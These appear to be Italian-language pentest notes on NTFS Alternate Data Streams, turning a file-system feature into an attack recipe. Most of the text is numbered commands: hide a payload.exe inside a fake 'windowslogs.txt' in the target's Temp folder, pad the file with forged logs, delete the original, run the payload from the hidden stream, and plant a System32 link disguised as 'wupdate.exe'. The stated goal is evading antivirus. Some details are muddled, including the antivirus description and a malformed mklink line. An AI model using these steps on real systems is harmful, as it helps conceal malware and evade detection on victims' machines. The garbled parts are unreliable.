Alternate Data Streams (ADS) è un attributo di file NTFS (New Technology File System) ed è stato progettato per fornire compatibilità  con il sistema HFS (Hierarchical File System) di MacOS.

Qualsiasi file creato su un'unità formattata con NTFS avrà due diverse biforcazioni/flussi:

- **Data Steams** - Flusso predefinito che contiene i dati del file.
- **Resources steams** - In genere contiene i metadati del file.

**Gli aggressori possono utilizzare gli ADS per nascondere codice o eseguibili dannosi in file legittimi al fine di eludere il rilevamento.**

Questa **tecnica** viene solitamente utilizzata per **eludere** i **sistemi AV basati sulle firme** **digitali** (**CVE e TTP)** e gli strumenti di scansione statica.

EXPLOIT

- **notepad FILE.txt:HIDDEN.FILE.txt** da Terminale Windows questo comando creerà un file nascosto .txt dentro il file visibile FILE.TXT (neanche i byte dell’hidden file saranno visualizzati)
    - notepad è il programma utilizzato, possiamo sostituirlo con qualsiasi programma, esempio Word

COME SFRUTTIAMO QUESTO FEATURE? 

1. **Caricare nella cartella Temp del Target un FILE.txt** apparentemente innocuo (ad esempio chiamandolo windowslogs.txt) ed un payload.exe 
2. **type payload.exe > windowslogs.txt:nomequalsiasi.exe** nasconde il file payload.exe all’interno del file windowslogs.txt
3. **Falsificare il contenuto del file windowslogs.tx**t con logs falsi in modo da non destare sospetti
4. **del payload.ex**e cancellare il payload dalla cartella TEMP
5. **start** **windowslogs.txt:nomequalsiasi.exe** avviare il payload.exe

oppure possiamo fare in modo che venga eseguito automaticamente

1. **cd Windows\System32\mklink wupdate.exe C:\Temp\windowslogs.txt:nomequalsiasi.exe** crea un link simbolico, ovvero ogni volta che digitiamo **wupdate** nella riga dei comandi si avvierà il payload
